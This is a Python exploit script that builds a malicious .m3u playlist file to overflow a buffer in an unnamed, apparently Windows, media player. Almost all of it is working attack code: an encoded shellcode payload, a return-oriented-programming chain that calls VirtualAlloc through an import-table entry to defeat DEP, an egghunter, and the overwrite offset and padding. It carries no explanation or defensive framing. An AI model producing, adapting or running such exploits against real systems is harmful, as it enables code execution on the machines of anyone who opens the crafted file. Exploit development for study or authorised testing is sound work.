#!/usr/bin/python 
import struct

def shellcode():
    buf =  b"\x90" * 50
    buf += b"\xbe\x07\xf9\x74\x45\xd9\xe5\xd9\x74\x24\xf4\x5f"
    buf += b"\x33\xc9\xb1\x52\x83\xc7\x04\x31\x77\x0e\x03\x70"
    buf += b"\xf7\x96\xb0\x82\xef\xd5\x3b\x7a\xf0\xb9\xb2\x9f"
    buf += b"\xc1\xf9\xa1\xd4\x72\xca\xa2\xb8\x7e\xa1\xe7\x28"
    buf += b"\xf4\xc7\x2f\x5f\xbd\x62\x16\x6e\x3e\xde\x6a\xf1"
    buf += b"\xbc\x1d\xbf\xd1\xfd\xed\xb2\x10\x39\x13\x3e\x40"
    buf += b"\x92\x5f\xed\x74\x97\x2a\x2e\xff\xeb\xbb\x36\x1c"
    buf += b"\xbb\xba\x17\xb3\xb7\xe4\xb7\x32\x1b\x9d\xf1\x2c"
    buf += b"\x78\x98\x48\xc7\x4a\x56\x4b\x01\x83\x97\xe0\x6c"
    buf += b"\x2b\x6a\xf8\xa9\x8c\x95\x8f\xc3\xee\x28\x88\x10"
    buf += b"\x8c\xf6\x1d\x82\x36\x7c\x85\x6e\xc6\x51\x50\xe5"
    buf += b"\xc4\x1e\x16\xa1\xc8\xa1\xfb\xda\xf5\x2a\xfa\x0c"
    buf += b"\x7c\x68\xd9\x88\x24\x2a\x40\x89\x80\x9d\x7d\xc9"
    buf += b"\x6a\x41\xd8\x82\x87\x96\x51\xc9\xcf\x5b\x58\xf1"
    buf += b"\x0f\xf4\xeb\x82\x3d\x5b\x40\x0c\x0e\x14\x4e\xcb"
    buf += b"\x71\x0f\x36\x43\x8c\xb0\x47\x4a\x4b\xe4\x17\xe4"
    buf += b"\x7a\x85\xf3\xf4\x83\x50\x53\xa4\x2b\x0b\x14\x14"
    buf += b"\x8c\xfb\xfc\x7e\x03\x23\x1c\x81\xc9\x4c\xb7\x78"
    buf += b"\x9a\xb2\xe0\xaf\xfd\x5b\xf3\xaf\x10\xc0\x7a\x49"
    buf += b"\x78\xe8\x2a\xc2\x15\x91\x76\x98\x84\x5e\xad\xe5"
    buf += b"\x87\xd5\x42\x1a\x49\x1e\x2e\x08\x3e\xee\x65\x72"
    buf += b"\xe9\xf1\x53\x1a\x75\x63\x38\xda\xf0\x98\x97\x8d"
    buf += b"\x55\x6e\xee\x5b\x48\xc9\x58\x79\x91\x8f\xa3\x39"
    buf += b"\x4e\x6c\x2d\xc0\x03\xc8\x09\xd2\xdd\xd1\x15\x86"
    buf += b"\xb1\x87\xc3\x70\x74\x7e\xa2\x2a\x2e\x2d\x6c\xba"
    buf += b"\xb7\x1d\xaf\xbc\xb7\x4b\x59\x20\x09\x22\x1c\x5f"
    buf += b"\xa6\xa2\xa8\x18\xda\x52\x56\xf3\x5e\x72\xb5\xd1"
    buf += b"\xaa\x1b\x60\xb0\x16\x46\x93\x6f\x54\x7f\x10\x85"
    buf += b"\x25\x84\x08\xec\x20\xc0\x8e\x1d\x59\x59\x7b\x21"
    buf += b"\xce\x5a\xae"

    return buf                        


# \x00\x09\x0a\x0b
IAT = 0x10032078 # (VirtualAllocStub IAT entry)

file = "crash1.m3u"
f = open(file , "wb")

CRASH_LEN = 30000  # change me
EIP_OFFSET = 26091

va  = struct.pack("<L", (0x45454545)) # dummy VirtualAlloc Address
va += struct.pack("<L", (0x46464646)) # Shellcode Return Address
va += struct.pack("<L", (0x47474747)) # # dummy Shellcode Address
va += struct.pack("<L", (0x48484848)) # dummy dwSize
va += struct.pack("<L", (0x49494949)) # # dummy flAllocationType
va += struct.pack("<L", (0x50505050)) # dummy flProtect

gadgets = [
    0x1002e892, # : push esp ; and al, 0x10 ; pop esi ; mov dword [edx], ecx ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;
    0x1001a507, # dec esi ; and al, 0x5E ; ret  ;

    0x1001076b, # pop ebx ; ret  ;
    0xFFFFFFFF, # -1
    0x1002d993, # inc ebx ; fpatan  ; ret  ;
    0x1002ccb3, # add ebx, esi ; stc  ; ret  ;

    0x10026d56, # pop eax ; ret  ;
    IAT,
    0x1002e0c8, # mov eax, dword [eax] ; ret  ;
    0x1001e82f, # mov dword [esi], eax ; xor eax, eax ; pop esi ; ret  ;
    0x41414141, # dummy for pop esi

    # return address
   
    0x100233cd, # mov eax, ebx ; pop ebp ; pop ebx ; ret  ;
    0x41414141, # dummy for pop ebp
    0x41414141, # dummy for pop ebx

    0x1002bfda, # neg eax ; pop edi ; pop esi ; ret  ;
    0x41414141, # dummy for pop edi
    0x41414141, # dummy for pop esi

    0x100246d7, # pop edx ; ret  ;
    0xfffffdff, # -0x201 (sbb will turn to -0x200)

    0x1002b77a, # neg edx ; neg eax ; sbb edx, 0x00000000 ; pop ebx ; retn 0x0010 ;
    0x41414141, # dummy for pop ebx
    0x10010833, # ret ROPNOP;
    0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010

    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100226e7, # mov dword [eax], 0x00000000 ; ret  ;
    0x1001291e, # add dword [eax], edx ; ret  ;
    0x10022234, # add dword [eax], eax ; ret  ;

    # shellcode address, same as return address

    0x100253bc, # xor edx, edx ; ret  ;
    0x10023fec, # add edx, dword [eax] ; pop esi ; ret  ;
    0x41414141, # dummy for pop esi

    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100226e7, # mov dword [eax], 0x00000000 ; ret  ;
    0x1001291e, # add dword [eax], edx ; ret  ;

    # set dwSize = 0x01
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;    

    0x100226e7, # mov dword [eax], 0x00000000 ; ret  ;
    0x10029e40, # inc dword [eax] ; pop ebp ; ret  ;
    0x41414141, # dummy for pop ebp

    # set flAllocationType = 0x1000

    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;

    0x1002bfda, # neg eax ; pop edi ; pop esi ; ret  ;
    0x41414141, # dummy for pop edi
    0x41414141, # dummy for pop esi

    0x100246d7, # pop edx ; ret  ;
    0xffffefff, # -0x1001 (sbb will turn to -0x1000)

    0x1002b77a, # neg edx ; neg eax ; sbb edx, 0x00000000 ; pop ebx ; retn 0x0010 ;
    0x41414141, # dummy for pop ebx
    0x10010833, # ret ROPNOP;
    0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010

    0x100226e7, # mov dword [eax], 0x00000000 ; ret  ;
    0x1001291e, # add dword [eax], edx ; ret  ; 

    # set flProtect = 0x40

    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;
    0x100114d7, # inc eax ; ret  ;

    0x1002bfda, # neg eax ; pop edi ; pop esi ; ret  ;
    0x41414141, # dummy for pop edi
    0x41414141, # dummy for pop esi

    0x100246d7, # pop edx ; ret  ;
    0xffffffbf, # -0x41 (sbb will turn to -0x40)

    0x1002b77a, # neg edx ; neg eax ; sbb edx, 0x00000000 ; pop ebx ; retn 0x0010 ;
    0x41414141, # dummy for pop ebx
    0x10010833, # ret ROPNOP;
    0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010
	0x41414141, # retn 0x0010

    0x100226e7, # mov dword [eax], 0x00000000 ; ret  ;
    0x1001291e, # add dword [eax], edx ; ret  ; 

    # adjust esp to the VirtualAlloc

    0x100246d7, # pop edx ; ret  ;
	0xffffffe8, # -0x18
    0x1001741e, # add eax, edx ; ret  ;
    0x1001e71d, # xchg eax, ebp ; ret  ;
    0x100252cc, # mov esp, ebp ; pop ebp ; ret  ;
]

def egghunter():
    egghunter = b"\x90" * 10
    egghunter += b"\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\xb8\x3a\xfe"
    egghunter += b"\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8"
    egghunter += b"\x77\x30\x30\x74\x89\xd7\xaf\x75\xe6\xaf\x75\xe3"
    egghunter += b"\x31\xc0\xb0\x40\x50\xb8\xff\xef\xff\xff\xf7\xd8"
    egghunter += b"\x48\x50\x31\xc0\x40\x50\x57\x57\xba\x78\x20\x03"
    egghunter += b"\x10\x8b\x02\x50\xc3"

    return egghunter

buffer = b""

for gadget in gadgets:
    buffer += struct.pack("<L", gadget)

junk =  b"A" * EIP_OFFSET
junk += struct.pack("<L", 0x10016a18) #: add esp, 0x1C ; ret  ;
junk += va
junk += buffer
junk += shellcode()
junk += egghunter()


junk += b"C" * (CRASH_LEN - len(junk))
f.write(junk)
f.close()
